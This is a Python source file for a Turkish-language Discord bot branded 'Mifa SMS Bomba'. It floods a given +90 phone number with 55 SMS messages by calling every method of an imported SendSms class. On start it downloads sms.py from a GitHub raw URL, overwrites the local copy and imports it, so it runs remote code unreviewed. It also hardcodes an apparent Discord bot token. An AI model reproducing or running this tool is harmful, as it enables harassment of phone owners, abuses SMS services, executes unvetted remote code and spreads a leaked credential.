import discord
from time import sleep
from requests import get
r = get("https://raw.githubusercontent.com/keshxrd/sms.py/main/sms.py").text
with open("sms.py", "r", encoding="utf-8") as f:
    read = f.read()
if read == r:
    pass
else:
    print("Güncelleme yapılıyor...")
    with open("sms.py", "w", encoding="utf-8") as f:
        f.write(r)
from sms import SendSms

TOKEN = "MTA4NjMzNDE4NjkzMzE5NDg2Mw.G-q78R._p4emL-PLYCYth5VWPF1BufivXXEI8RlRZaHb8"
gif = "https://cdn.discordapp.com/avatars/772118438582812692/81a7d02c7d317e74cd3d1bdb2d8bfbcb.webp"
adet = 55
saniye = 0 

intents = discord.Intents.all()
client = discord.Client(intents=intents)

@client.event
async def on_ready():
    print('{} Çalışmaya Başladı!'.format(client.user))
    activity = discord.Activity(type=discord.ActivityType.playing, name="MifaOs Tarafından Kodlandı")
    await client.change_presence(activity=activity)
    
@client.event
async def on_message(message):
    if message.author == client.user:
        return

    if len(message.content.split(" ")) == 2 and message.content.split(" ")[0] == "*sms":
        if len(message.content.split(" ")[1]) == 10:
            telno = message.content.split(" ")[1]
            embed=discord.Embed(title="Mifa Sms (+90)", description=(telno+" **Numarasına** "+str(adet)+" ** Adet SMS Gönderimi Başarıyla Başlatıldı.** \n **Gönderim Bittiğinde Sizi Bilgilendireceğim.**"+message.author.mention), color=000000)
            embed.set_author(name='Mifa Sms', url='https://discord.gg/asilpin', icon_url='https://cdn.discordapp.com/avatars/772118438582812692/81a7d02c7d317e74cd3d1bdb2d8bfbcb.webp')
            embed.set_footer(text="Komut "+message.author.name+" Tarafından Kullanıldı")
            embed.set_thumbnail(url=gif)
            await message.channel.send(embed=embed)
            sms = SendSms(telno, "")
            while sms.adet < adet:
                for attribute in dir(SendSms):
                    attribute_value = getattr(SendSms, attribute)
                    if callable(attribute_value):
                        if attribute.startswith('__') == False:
                            if sms.adet == adet:
                                break
                            exec("sms."+attribute+"()")
                            sleep(saniye)
            embed=discord.Embed(title="Mifa SMS Bomba (+90)", description=(telno+" **Numarasına** "+str(sms.adet)+" ** Adet SMS Başarıyla Gönderilmiştir.** "), color=000000)
            embed.set_thumbnail(url=gif)
            embed.set_author(name='Metin2 SMS Bomba', url='https://discord.gg/asilpin', icon_url='https://cdn.discordapp.com/avatars/772118438582812692/81a7d02c7d317e74cd3d1bdb2d8bfbcb.webp')
            embed.set_footer(text="Komut "+message.author.name+" Tarafından Kullanıldı")
            await message.channel.send(embed=embed)
            await message.channel.send('https://discord.gg/albaraka')
            await message.channel.send(message.author.mention)
        else:
            embed=discord.Embed(title="Mifa Sms   (+90)", description=("**Başında 0 Olmaması Lazım!**"), color=000000)
            embed.set_author(name='Mifa Sms SMS Bomba', url='https://discord.gg/asilpin', icon_url='https://cdn.discordapp.com/avatars/772118438582812692/81a7d02c7d317e74cd3d1bdb2d8bfbcb.webp')
            embed.set_footer(text="Komut "+message.author.name+" Tarafından Kullanıldı")
            embed.set_thumbnail(url=gif)
            await message.channel.send(embed=embed)
    elif "*help" == message.content:
        await message.channel.send("**Sms göndermek için komutu aşağıdaki gibi yazınız.**\n```*sms 5051234567```\n***sms (telefon numarası)**\n"+message.author.mention)
    else:
        pass
  
client.run(TOKEN)
